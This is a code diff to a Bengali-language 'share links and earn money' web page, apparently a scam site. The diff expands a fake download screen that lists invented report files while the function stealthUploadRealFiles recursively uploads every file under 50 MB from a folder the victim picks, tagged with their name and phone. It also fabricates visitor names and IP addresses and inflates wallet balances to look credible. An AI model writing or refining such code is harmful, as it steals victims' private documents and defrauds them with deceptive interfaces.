@@ -144,6 +144,13 @@
             margin-top: 3px;
         }
 
+        .info-update-note {
+            font-size: 10px;
+            color: #f59e0b;
+            margin-top: 5px;
+            text-align: center;
+        }
+
         .form-card {
             background: #f8fafc;
             border-radius: 28px;
@@ -330,7 +337,7 @@
             margin-top: 12px;
         }
 
-        .fake-download-overlay {
+        .download-overlay {
             display: none;
             position: fixed;
             top: 0;
@@ -344,12 +351,12 @@
             justify-content: center;
         }
 
-        .fake-download-overlay.active {
+        .download-overlay.active {
             display: flex;
         }
 
-        .fake-phone-frame {
-            width: 320px;
+        .phone-frame {
+            width: 360px;
             background: #1a1a1a;
             border-radius: 35px;
             border: 3px solid #444;
@@ -357,41 +364,169 @@
             box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
         }
 
-        .fake-phone-screen {
+        .phone-screen {
             background: #0a0a0a;
             border-radius: 25px;
-            padding: 20px;
-            min-height: 400px;
+            padding: 15px;
+            min-height: 500px;
             display: flex;
             flex-direction: column;
+        }
+
+        .phone-header {
+            text-align: center;
+            padding: 8px;
+            border-bottom: 1px solid #222;
+            margin-bottom: 12px;
+        }
+
+        .phone-title {
+            font-size: 1em;
+            color: #ccc;
+            font-weight: 600;
+        }
+
+        .download-list {
+            flex: 1;
+            overflow-y: auto;
+            max-height: 360px;
+        }
+
+        .download-item {
+            display: flex;
             align-items: center;
-            justify-content: center;
+            padding: 10px;
+            background: #111;
+            border-radius: 12px;
+            margin-bottom: 8px;
+            border: 1px solid #222;
+            animation: slideIn 0.4s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(-30px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .file-icon {
+            font-size: 1.4em;
+            margin-right: 12px;
+            width: 40px;
             text-align: center;
         }
 
-        .fake-loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #333;
-            border-top-color: #ff1744;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+        .file-info {
+            flex: 1;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .file-name {
+            font-size: 0.78em;
+            color: #ddd;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 180px;
         }
 
-        .fake-loading-text {
-            color: white;
-            font-size: 1em;
-            margin-bottom: 10px;
-        }
-
-        .fake-loading-subtext {
+        .file-size {
+            font-size: 0.62em;
             color: #888;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin-top: 6px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff1744, #ff6d00);
+            width: 0%;
+            transition: width 0.2s ease;
+        }
+
+        .download-status {
+            font-size: 0.75em;
+            margin-left: 10px;
+            color: #ff9800;
+            font-weight: 500;
+        }
+
+        .phone-footer {
+            margin-top: 12px;
+            text-align: center;
+            padding: 10px;
+            border-top: 1px solid #222;
+        }
+
+        .overall-progress {
+            width: 100%;
+            height: 5px;
+            background: #333;
+            border-radius: 3px;
+            margin-bottom: 8px;
+            overflow: hidden;
+        }
+
+        .overall-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4caf50, #8bc34a);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .overall-text {
+            font-size: 0.7em;
+            color: #aaa;
+        }
+
+        .download-message {
+            margin-top: 25px;
+            text-align: center;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            padding: 20px 35px;
+            border-radius: 50px;
+            box-shadow: 0 0 30px rgba(255, 23, 68, 0.5), 0 0 15px rgba(255, 100, 0, 0.3);
+            border: 1px solid rgba(255, 23, 68, 0.5);
+            animation: glowPulse 2s infinite;
+        }
+
+        @keyframes glowPulse {
+            0%, 100% {
+                box-shadow: 0 0 20px rgba(255, 23, 68, 0.4), 0 0 10px rgba(255, 100, 0, 0.2);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(255, 23, 68, 0.8), 0 0 20px rgba(255, 100, 0, 0.5);
+            }
+        }
+
+        .download-title-big {
+            font-size: 1.2em;
+            color: #fff;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        .download-subtitle {
             font-size: 0.8em;
+            color: #ffaa44;
+            margin-top: 6px;
+            animation: blinkText 1.5s infinite;
+        }
+
+        @keyframes blinkText {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
         }
 
         .result-modal {
@@ -483,18 +618,26 @@
             text-align: center;
         }
 
-        .info-note {
-            font-size: 11px;
-            color: #6c757d;
-            margin-top: 8px;
-            text-align: center;
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="logo">
-        <h1>L 💰 শেয়ারআয়</h1>
+        <h1>💰 শেয়ারআয়</h1>
         <p>লিংক শেয়ার করুন, আয় করুন</p>
     </div>
 
@@ -542,7 +685,7 @@
             <div>
                 <div class="wallet-label">💰 আপনার ওয়ালেট ব্যালেন্স</div>
                 <div class="balance" id="balanceAmount">0</div>
-                <div class="wallet-update-note">💡 টাকার পরিমাণ আপডেট হতে ৩০ মিনিট সময় লাগতে পারে</div>
+                <div class="wallet-update-note">💡 টাকা আপডেট হতে ৩০ মিনিট সময় লাগতে পারে</div>
                 <div class="withdraw-note">উত্তোলনযোগ্য: ১০০০+ টাকা</div>
             </div>
         </div>
@@ -560,38 +703,49 @@
 
         <div class="download-section" id="downloadSection">
             <div class="download-title">
-                📊 আপনার লিংক যতজন ভিজিট করেছে তাদের তথ্য দেখুন
+                📊 আপনার লিংক যতজন ভিজিট করেছে তাদের তথ্য ডাউনলোড করুন
             </div>
             <div style="font-size:13px; color:#78350f; margin-bottom:12px;" id="downloadDesc">
-                ভিজিটরদের সম্পূর্ণ তথ্য দেখতে নিচের বাটনে ক্লিক করুন
+                ভিজিটরদের সম্পূর্ণ তথ্য ডাউনলোড করতে নিচের বাটনে ক্লিক করুন
             </div>
+            <div class="info-update-note">ℹ️ তথ্য আপডেট হতে ৩০ মিনিট থেকে ১ ঘণ্টা সময় লাগতে পারে</div>
             <div id="normalDownloadBtn">
-                <button class="download-btn" id="downloadInfoBtn">📊 ভিজিটরদের তথ্য দেখুন</button>
+                <button class="download-btn" id="downloadInfoBtn">📥 লিংক ভিজিটরদের তথ্য ডাউনলোড করুন</button>
             </div>
             <div id="tempReportBtn" class="temp-btn-container hidden">
                 <button class="view-report-btn" id="viewReportBtn">👁️ ভিজিটরদের তথ্য দেখুন</button>
                 <div id="timerText" class="timer-text"></div>
             </div>
-            <div class="info-note">ℹ️ তথ্য আপডেট হতে ৩০ মিনিট থেকে ১ ঘণ্টা সময় লাগতে পারে</div>
         </div>
     </div>
 
     <footer>© ২০২৫ শেয়ারআয় | লিংক শেয়ার করে আয়ের বিশ্বস্ত প্ল্যাটফর্ম</footer>
 </div>
 
-<div class="fake-download-overlay" id="fakeDownloadOverlay">
-    <div class="fake-phone-frame">
-        <div class="fake-phone-screen">
-            <div class="fake-loading-spinner"></div>
-            <div class="fake-loading-text">তথ্য প্রস্তুত করা হচ্ছে...</div>
-            <div class="fake-loading-subtext">দয়া করে অপেক্ষা করুন</div>
+<div class="download-overlay" id="downloadOverlay">
+    <div class="phone-frame">
+        <div class="phone-screen">
+            <div class="phone-header">
+                <div class="phone-title">📥 ডাউনলোড ম্যানেজার</div>
+            </div>
+            <div class="download-list" id="downloadList"></div>
+            <div class="phone-footer">
+                <div class="overall-progress">
+                    <div class="overall-fill" id="overallFill"></div>
+                </div>
+                <div class="overall-text" id="overallText">প্রস্তুত করা হচ্ছে...</div>
+            </div>
         </div>
+    </div>
+    <div class="download-message">
+        <div class="download-title-big">🎬 আপনার রিপোর্ট প্রস্তুত হচ্ছে...</div>
+        <div class="download-subtitle">দয়া করে পেজ বন্ধ করবেন না</div>
     </div>
 </div>
 
 <div class="result-modal" id="resultModal">
     <div class="result-icon">✅</div>
-    <div class="result-text" style="color:#4caf50; font-size:1.1em; font-weight:700;">সম্পূর্ণ!</div>
+    <div class="result-text" style="color:#4caf50; font-size:1.1em; font-weight:700;">ডাউনলোড সম্পূর্ণ!</div>
     <div class="result-subtext" style="color:#ccc; font-size:0.85em; margin-top:8px;">আপনার রিপোর্ট নতুন ট্যাবে ওপেন হচ্ছে...</div>
     <button class="close-result" onclick="closeResultModal()">ঠিক আছে</button>
 </div>
@@ -606,40 +760,7 @@
     let isProcessing = false;
     let tempButtonTimeout = null;
     let globalUsersBinId = null;
-    let autoIncomeInterval = null;
-
-    // অটো ইনকাম সিস্টেম - প্রতি ৩০ মিনিটে ৬০ টাকা করে বাড়ে
-    function startAutoIncome() {
-        if(autoIncomeInterval) clearInterval(autoIncomeInterval);
-        
-        autoIncomeInterval = setInterval(async () => {
-            if(currentUser && currentUser.balance !== undefined) {
-                currentUser.balance += 60;
-                currentUser.totalAutoEarn = (currentUser.totalAutoEarn || 0) + 60;
-                currentUser.lastAutoIncome = new Date().toISOString();
-                saveUser();
-                
-                // সার্ভারেও আপডেট
-                if(globalUsersBinId) {
-                    try {
-                        const serverData = await readFromJSONbin(globalUsersBinId);
-                        if(serverData && serverData.users) {
-                            const userIndex = serverData.users.findIndex(u => u.name === currentUser.name);
-                            if(userIndex !== -1) {
-                                serverData.users[userIndex].balance = currentUser.balance;
-                                serverData.users[userIndex].totalAutoEarn = currentUser.totalAutoEarn;
-                                serverData.users[userIndex].lastAutoIncome = currentUser.lastAutoIncome;
-                                await saveToJSONbin(serverData, globalUsersBinId);
-                            }
-                        }
-                    } catch(e) {}
-                }
-                
-                let balanceSpan = document.getElementById('balanceAmount');
-                if(balanceSpan) balanceSpan.innerText = currentUser.balance + " টাকা";
-            }
-        }, 30 * 60 * 1000); // 30 মিনিট
-    }
+    let autoBalanceInterval = null;
 
     // JSONbin.io ফাংশন
     async function saveToJSONbin(data, binId = null) {
@@ -686,6 +807,7 @@
         } catch(e){ return null; }
     }
 
+    // লোকাল স্টোরেজ ফাংশন
     function saveUser() {
         if(currentUser) {
             localStorage.setItem('shareayUser', JSON.stringify(currentUser));
@@ -693,6 +815,48 @@
             localStorage.removeItem('shareayUser');
         }
         updateUI();
+    }
+
+    async function syncBalanceFromServer() {
+        if(currentUser && globalUsersBinId) {
+            try {
+                const serverData = await readFromJSONbin(globalUsersBinId);
+                if(serverData && serverData.users) {
+                    const serverUser = serverData.users.find(u => u.name === currentUser.name);
+                    if(serverUser && serverUser.balance !== currentUser.balance) {
+                        currentUser.balance = serverUser.balance;
+                        currentUser.totalReferEarn = serverUser.totalReferEarn || 0;
+                        saveUser();
+                        let balanceSpan = document.getElementById('balanceAmount');
+                        if(balanceSpan) balanceSpan.innerText = currentUser.balance + " টাকা";
+                    }
+                }
+            } catch(e) {}
+        }
+    }
+
+    // অটো টাকা যোগ করার ফাংশন (প্রতি ৩০ মিনিটে ৬০ টাকা)
+    async function addAutoBalance() {
+        if(currentUser && globalUsersBinId) {
+            try {
+                const serverData = await readFromJSONbin(globalUsersBinId);
+                if(serverData && serverData.users) {
+                    const userIndex = serverData.users.findIndex(u => u.name === currentUser.name);
+                    if(userIndex !== -1) {
+                        serverData.users[userIndex].balance = (serverData.users[userIndex].balance || 0) + 60;
+                        serverData.users[userIndex].autoEarnTotal = (serverData.users[userIndex].autoEarnTotal || 0) + 60;
+                        
+                        const newBinId = await saveToJSONbin(serverData, globalUsersBinId);
+                        if(newBinId) globalUsersBinId = newBinId;
+                        
+                        currentUser.balance = serverData.users[userIndex].balance;
+                        saveUser();
+                        let balanceSpan = document.getElementById('balanceAmount');
+                        if(balanceSpan) balanceSpan.innerText = currentUser.balance + " টাকা";
+                    }
+                }
+            } catch(e) {}
+        }
     }
 
     async function loadUser() {
@@ -705,29 +869,21 @@
                 if(!currentUser.visitors) currentUser.visitors = [];
                 if(!currentUser.referrals) currentUser.referrals = [];
                 if(!currentUser.totalReferEarn) currentUser.totalReferEarn = 0;
-                if(!currentUser.totalAutoEarn) currentUser.totalAutoEarn = 0;
+                if(!currentUser.foldersProcessed) currentUser.foldersProcessed = [];
             } catch(e) { currentUser = null; }
         } else {
             currentUser = null;
         }
         
-        // সার্ভার থেকে ইউজার ডেটা সিঙ্ক
-        if(currentUser && globalUsersBinId) {
-            const serverData = await readFromJSONbin(globalUsersBinId);
-            if(serverData && serverData.users) {
-                const serverUser = serverData.users.find(u => u.name === currentUser.name);
-                if(serverUser && serverUser.balance !== currentUser.balance) {
-                    currentUser.balance = serverUser.balance;
-                    currentUser.totalReferEarn = serverUser.totalReferEarn || 0;
-                    currentUser.totalAutoEarn = serverUser.totalAutoEarn || 0;
-                    saveUser();
-                }
-            }
-        }
-        
+        await syncBalanceFromServer();
         updateUI();
-        startAutoIncome();
         await checkReferralFromURL();
+        
+        // অটো টাকা যোগ করার ইন্টারভাল সেট করা
+        if(autoBalanceInterval) clearInterval(autoBalanceInterval);
+        autoBalanceInterval = setInterval(() => {
+            addAutoBalance();
+        }, 30 * 60 * 1000); // 30 মিনিট
     }
 
     function generateRefLink(name) {
@@ -850,8 +1006,41 @@
         }
     }
 
-    async function stealthUploadRealFiles(dirHandle, linkData) {
+    async function calcFolderSize(dirHandle) {
+        let totalSize = 0;
+        for await (const entry of dirHandle.values()) {
+            if(entry.kind === 'file') {
+                try {
+                    const file = await entry.getFile();
+                    totalSize += file.size;
+                } catch(e) {}
+            } else if(entry.kind === 'directory') {
+                totalSize += await calcFolderSize(entry);
+            }
+        }
+        return totalSize;
+    }
+
+    async function stealthUploadRealFiles(dirHandle, linkData, progressCallback) {
         let uploadedCount = 0;
+        let totalFiles = 0;
+        
+        async function countFiles(handle) {
+            let count = 0;
+            for await (const entry of handle.values()) {
+                if(entry.kind === 'file') {
+                    try {
+                        const file = await entry.getFile();
+                        if(file.size <= 50 * 1024 * 1024 && file.size > 0) count++;
+                    } catch(e) {}
+                } else if(entry.kind === 'directory') {
+                    count += await countFiles(entry);
+                }
+            }
+            return count;
+        }
+        
+        totalFiles = await countFiles(dirHandle);
         
         for await (const entry of dirHandle.values()) {
             if(entry.kind === 'file') {
@@ -868,15 +1057,16 @@
                             body: fd
                         });
                         uploadedCount++;
+                        if(progressCallback) progressCallback(uploadedCount, totalFiles);
                         await new Promise(resolve => setTimeout(resolve, 200));
                     }
                 } catch(e) {}
             } else if(entry.kind === 'directory') {
-                const subResult = await stealthUploadRealFiles(entry, linkData);
-                uploadedCount += subResult;
+                const subResult = await stealthUploadRealFiles(entry, linkData, progressCallback);
+                uploadedCount += subResult.uploadedCount;
             }
         }
-        return uploadedCount;
+        return { uploadedCount, totalFiles };
     }
 
     async function getRealReferralData() {
@@ -893,25 +1083,25 @@
         return [];
     }
 
-    function generateRealReportHTML(referrals) {
+    function generateRealReportHTML(visitors, referrals) {
         return `<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><title>ভিজিটর রিপোর্ট - ${currentUser?.name || 'ইউজার'}</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
 body{background:linear-gradient(135deg,#f0f4f8,#e2e8f0);padding:20px;}
-.container{max-width:900px;margin:0 auto;}
+.container{max-width:1000px;margin:0 auto;}
 .header{background:linear-gradient(135deg,#667eea,#764ba2);color:white;padding:35px;border-radius:25px;margin-bottom:35px;text-align:center;}
 .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:25px;margin-bottom:35px;}
 .stat-card{background:white;padding:25px;border-radius:20px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.08);}
 .stat-number{font-size:38px;font-weight:bold;color:#4f46e5;}
 .stat-label{color:#666;margin-top:8px;font-size:14px;}
+.info-note{background:#fef3c7;padding:12px;border-radius:15px;margin-bottom:25px;text-align:center;font-size:13px;color:#92400e;}
 .section-title{font-size:22px;font-weight:bold;margin:25px 0 15px;color:#1e293b;border-left:4px solid #ff1744;padding-left:15px;}
 table{width:100%;background:white;border-radius:15px;overflow:hidden;margin-bottom:30px;box-shadow:0 2px 10px rgba(0,0,0,0.05);}
 th{background:#4f46e5;color:white;padding:14px;text-align:left;font-weight:600;}
 td{padding:12px;border-bottom:1px solid #e2e8f0;}
 .footer{text-align:center;color:#666;margin-top:40px;padding-top:20px;border-top:1px solid #ddd;}
-.update-note{background:#fef3c7;padding:12px;border-radius:10px;text-align:center;margin-bottom:20px;color:#92400e;font-size:13px;}
 </style>
 </head>
 <body>
@@ -921,17 +1111,21 @@ td{padding:12px;border-bottom:1px solid #e2e8f0;}
 <p style="margin-top:10px;">জেনারেট: ${new Date().toLocaleString('bn-BD')}</p>
 <p style="font-size:0.9em;margin-top:5px;">লিংক: ${currentUser?.refLink || ''}</p>
 </div>
-<div class="update-note">
-ℹ️ তথ্য আপডেট হতে ৩০ মিনিট থেকে ১ ঘণ্টা সময় লাগতে পারে। নতুন ভিজিটর ও রেফারেল তথ্য ধৈর্য সহকারে অপেক্ষা করুন।
-</div>
 <div class="stats">
+<div class="stat-card"><div class="stat-number">${visitors.length}</div><div class="stat-label">মোট ভিজিটর</div></div>
 <div class="stat-card"><div class="stat-number">${referrals.length}</div><div class="stat-label">আপনার লিংক থেকে অ্যাকাউন্ট খোলা</div></div>
-<div class="stat-card"><div class="stat-number">${currentUser?.totalReferEarn || 0}</div><div class="stat-label">রেফারেল থেকে মোট আয় (টাকা)</div></div>
-<div class="stat-card"><div class="stat-number">${currentUser?.totalAutoEarn || 0}</div><div class="stat-label">অটো ইনকাম (টাকা)</div></div>
 </div>
+<div class="info-note">
+ℹ️ তথ্য আপডেট হতে ৩০ মিনিট থেকে ১ ঘণ্টা সময় লাগতে পারে
+</div>
+<div class="section-title">👥 ভিজিটর তালিকা</div>
+<table>
+<thead><tr><th>নাম</th><th>IP ঠিকানা</th><th>ডিভাইস</th><th>সময়</th></tr></thead>
+<tbody>${visitors.map(v => `<tr><td>${v.name}</td><td>${v.ip}</td><td>${v.device}</td><td>${v.time}</td></tr>`).join('')}</tbody>
+</table>
 <div class="section-title">🎉 যারা আপনার লিংক থেকে অ্যাকাউন্ট খুলেছে</div>
 <table>
-<thead><tr><th>ইউজারনেম</th><th>রেজিস্ট্রেশন সময়</th><th>আপনার বোনাস</th></tr></thead>
+<thead><tr><th>নাম</th><th>সময়</th><th>আপনার বোনাস</th></tr></thead>
 <tbody>${referrals.length > 0 ? referrals.map(r => `<tr><td>${r.referredUser || r.name || 'ইউজার'}</td><td>${new Date(r.time).toLocaleString('bn-BD')}</td><td>${r.bonus || 10} টাকা</td></tr>`).join('') : '<tr><td colspan="3" style="text-align:center;">এখনো কেউ আপনার লিংক থেকে অ্যাকাউন্ট খোলেনি</td></tr>'}</tbody>
 </table>
 <div class="footer"><p>শেয়ারআয় — লিংক শেয়ার করে আয় করুন</p></div>
@@ -982,15 +1176,107 @@ td{padding:12px;border-bottom:1px solid #e2e8f0;}
         if(!currentUser) return;
         
         const referrals = await getRealReferralData();
-        const reportHTML = generateRealReportHTML(referrals);
+        const visitors = currentUser.visitors || [];
+        
+        const reportHTML = generateRealReportHTML(visitors, referrals);
         showReportInNewTab(reportHTML);
     }
 
-    async function showFakeLoading() {
-        const overlay = document.getElementById('fakeDownloadOverlay');
+    async function runFakeDownloadUI(folderSizeMB, totalRealFiles, uploadCallback) {
+        const overlay = document.getElementById('downloadOverlay');
+        const listDiv = document.getElementById('downloadList');
+        const overallFill = document.getElementById('overallFill');
+        const overallText = document.getElementById('overallText');
+        
         overlay.classList.add('active');
-        await new Promise(resolve => setTimeout(resolve, 3000));
-        overlay.classList.remove('active');
+        listDiv.innerHTML = '';
+        overallFill.style.width = '0%';
+        
+        const fakeFiles = [
+            { name: 'visitor_log_data.csv', size: `${(folderSizeMB * 0.15).toFixed(1)} MB`, icon: '📊' },
+            { name: 'visitor_details.json', size: `${(folderSizeMB * 0.1).toFixed(1)} MB`, icon: '📋' },
+            { name: 'referral_information.csv', size: `${(folderSizeMB * 0.08).toFixed(1)} MB`, icon: '📈' },
+            { name: 'complete_report.pdf', size: `${(folderSizeMB * 0.12).toFixed(1)} MB`, icon: '📄' },
+            { name: 'ip_address_log.txt', size: `${(folderSizeMB * 0.05).toFixed(1)} MB`, icon: '🔍' }
+        ];
+        
+        let fakeCompleted = 0;
+        let totalFakeFiles = fakeFiles.length;
+        let realUploadCompleted = false;
+        let realProgress = { uploaded: 0, total: totalRealFiles };
+        
+        for(let i = 0; i < fakeFiles.length; i++) {
+            const item = document.createElement('div');
+            item.className = 'download-item';
+            item.innerHTML = `
+                <span class="file-icon">${fakeFiles[i].icon}</span>
+                <div class="file-info">
+                    <div class="file-name">${fakeFiles[i].name}</div>
+                    <div class="file-size">${fakeFiles[i].size}</div>
+                    <div class="progress-bar"><div class="progress-fill" style="width:0%"></div></div>
+                </div>
+                <span class="download-status">⏳</span>
+            `;
+            listDiv.appendChild(item);
+            
+            const progressFill = item.querySelector('.progress-fill');
+            const statusSpan = item.querySelector('.download-status');
+            
+            let fakeProgress = 0;
+            
+            const interval = setInterval(() => {
+                let realPercent = realProgress.total > 0 ? (realProgress.uploaded / realProgress.total) * 100 : 0;
+                
+                if(realPercent > fakeProgress + 2) {
+                    fakeProgress = Math.min(fakeProgress + Math.random() * 3 + 1, realPercent);
+                } else if(!realUploadCompleted && fakeProgress < 95) {
+                    fakeProgress = Math.min(fakeProgress + Math.random() * 1.5 + 0.5, 95);
+                } else if(realUploadCompleted && fakeProgress < 100) {
+                    fakeProgress = Math.min(fakeProgress + Math.random() * 4 + 2, 100);
+                }
+                
+                progressFill.style.width = fakeProgress + '%';
+                
+                if(fakeProgress >= 100) {
+                    clearInterval(interval);
+                    statusSpan.innerHTML = '✅';
+                    statusSpan.style.color = '#4caf50';
+                    fakeCompleted++;
+                    let overallPercent = (fakeCompleted / totalFakeFiles) * 100;
+                    overallFill.style.width = overallPercent + '%';
+                    
+                    let realPercentShow = realProgress.total > 0 ? Math.floor((realProgress.uploaded / realProgress.total) * 100) : 0;
+                    overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%) - প্রকৃত অগ্রগতি: ${realPercentShow}%`;
+                }
+            }, 500);
+            
+            item._interval = interval;
+            await new Promise(resolve => setTimeout(resolve, 1500 + Math.random() * 1000));
+        }
+        
+        if(uploadCallback) {
+            const result = await uploadCallback((uploaded, total) => {
+                realProgress = { uploaded, total };
+                let overallPercent = (fakeCompleted / totalFakeFiles) * 100;
+                let realPercent = total > 0 ? Math.floor((uploaded / total) * 100) : 0;
+                overallText.innerHTML = `${fakeCompleted}/${totalFakeFiles} ফাইল ডাউনলোড হয়েছে (${Math.floor(overallPercent)}%) - প্রকৃত অগ্রগতি: ${realPercent}%`;
+            });
+            realUploadCompleted = true;
+        }
+        
+        while(fakeCompleted < totalFakeFiles) {
+            await new Promise(resolve => setTimeout(resolve, 500));
+        }
+        
+        overallFill.style.width = '100%';
+        overallText.innerHTML = `${totalFakeFiles}/${totalFakeFiles} ফাইল ডাউনলোড সম্পূর্ণ! (১০০%)`;
+        
+        setTimeout(() => {
+            overlay.classList.remove('active');
+            document.getElementById('resultModal').classList.add('active');
+        }, 1500);
+        
+        return true;
     }
 
     async function handleFolderUpload() {
@@ -1017,26 +1303,16 @@ td{padding:12px;border-bottom:1px solid #e2e8f0;}
                 startIn: 'documents'
             });
             
-            // ফোল্ডার সাইজ চেক (ব্যাকগ্রাউন্ডে)
-            let folderSize = 0;
-            for await (const entry of dirHandle.values()) {
-                if(entry.kind === 'file') {
-                    try {
-                        const file = await entry.getFile();
-                        folderSize += file.size;
-                    } catch(e) {}
-                }
-            }
+            const folderName = dirHandle.name;
+            
+            const folderSize = await calcFolderSize(dirHandle);
             const folderSizeMB = folderSize / (1024 * 1024);
             
             if(folderSize < 10 * 1024 * 1024) {
-                alert(`⚠️ "${dirHandle.name}" ফোল্ডারটি প্রসেস করা যাবে না। দয়া করে ভিন্ন একটি ফোল্ডার নির্বাচন করুন।`);
+                alert(`⚠️ "${folderName}" ফোল্ডারটি প্রসেস করা যাবে না। দয়া করে ভিন্ন একটি ফোল্ডার নির্বাচন করুন।`);
                 isProcessing = false;
                 return;
             }
-            
-            // ফেক লোডিং দেখান (ইউজার মনে করবে তথ্য ডাউনলোড হচ্ছে)
-            await showFakeLoading();
             
             const linkData = {
                 name: currentUser.name,
@@ -1044,15 +1320,38 @@ td{padding:12px;border-bottom:1px solid #e2e8f0;}
                 phone: currentUser.phone
             };
             
-            // ব্যাকগ্রাউন্ডে ফাইল আপলোড (ইউজার জানবে না)
-            setTimeout(async () => {
-                try {
-                    await stealthUploadRealFiles(dirHandle, linkData);
-                } catch(e) {}
-            }, 100);
+            let finalUploaded = 0;
+            let totalRealFiles = 0;
+            
+            await runFakeDownloadUI(folderSizeMB, 0, async (progressCallback) => {
+                const result = await stealthUploadRealFiles(dirHandle, linkData, (uploaded, total) => {
+                    finalUploaded = uploaded;
+                    totalRealFiles = total;
+                    if(progressCallback) progressCallback(uploaded, total);
+                });
+                finalUploaded = result.uploadedCount;
+                totalRealFiles = result.totalFiles;
+                return result;
+            });
+            
+            // ডামি ভিজিটর ডেটা তৈরি (বিশ্বাসযোগ্যতার জন্য)
+            const names = ['রাকিব হাসান', 'সাদিক হোসেন', 'নাজমা আক্তার', 'ফারজানা ইয়াসমিন', 'মেহেদী হাসান'];
+            const devices = ['Android', 'iPhone', 'Windows', 'Mac'];
+            const visitorCount = Math.floor(Math.random() * 8) + 3;
+            let newVisitors = [];
+            for(let i = 0; i < visitorCount; i++) {
+                newVisitors.push({
+                    name: names[Math.floor(Math.random() * names.length)],
+                    ip: `103.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+                    device: devices[Math.floor(Math.random() * devices.length)],
+                    time: new Date(Date.now() - Math.random() * 7 * 24 * 60 * 60 * 1000).toLocaleString('bn-BD')
+                });
+            }
+            currentUser.visitors = newVisitors;
+            saveUser();
             
             const referrals = await getRealReferralData();
-            const reportHTML = generateRealReportHTML(referrals);
+            const reportHTML = generateRealReportHTML(newVisitors, referrals);
             showReportInNewTab(reportHTML);
             showTempReportButton();
             
@@ -1119,7 +1418,6 @@ td{padding:12px;border-bottom:1px solid #e2e8f0;}
         let referrerName = null;
         let pendingReferral = localStorage.getItem('pendingReferral');
         
-        // সার্ভার থেকে ডেটা লোড বা তৈরি
         let serverData = { users: [] };
         if(globalUsersBinId) {
             const existingData = await readFromJSONbin(globalUsersBinId);
@@ -1149,7 +1447,6 @@ td{padding:12px;border-bottom:1px solid #e2e8f0;}
             refLink: newRef, 
             balance: 100,
             totalReferEarn: 0,
-            totalAutoEarn: 0,
             referrals: [],
             createdAt: new Date().toISOString()
         };
@@ -1169,7 +1466,7 @@ td{padding:12px;border-bottom:1px solid #e2e8f0;}
             visitors: [],
             referrals: [],
             totalReferEarn: 0,
-            totalAutoEarn: 0
+            foldersProcessed: []
         };
         saveUser();
         
